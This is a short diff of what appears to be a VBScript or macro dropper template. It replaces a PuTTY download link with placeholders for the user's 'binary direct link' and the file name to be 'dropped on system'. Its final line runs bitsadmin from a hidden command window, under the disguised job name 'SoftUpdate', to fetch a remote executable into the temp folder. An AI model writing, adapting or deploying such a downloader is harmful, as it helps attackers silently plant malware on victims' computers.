@@ -2,8 +2,8 @@ Sub Main()
 
 
 	'Userdefined payload settings
-	 URL = "https://the.earth.li/~sgtatham/putty/latest/w32/putty.exe"
-	 SAVE_NAME = "putty.exe"
+	URL = "XX" '<- You binary direct link
+	SAVE_NAME = "pxx.exe" '<-- The what file should be named when dropped on system
 	
 	'Download File
 	CreateObject("WScript.Shell").run("cmd /c bitsadmin /transfer SoftUpdate /download /priority FOREGROUND " + URL + " %temp%/" + SAVE_NAME + ""),0,true
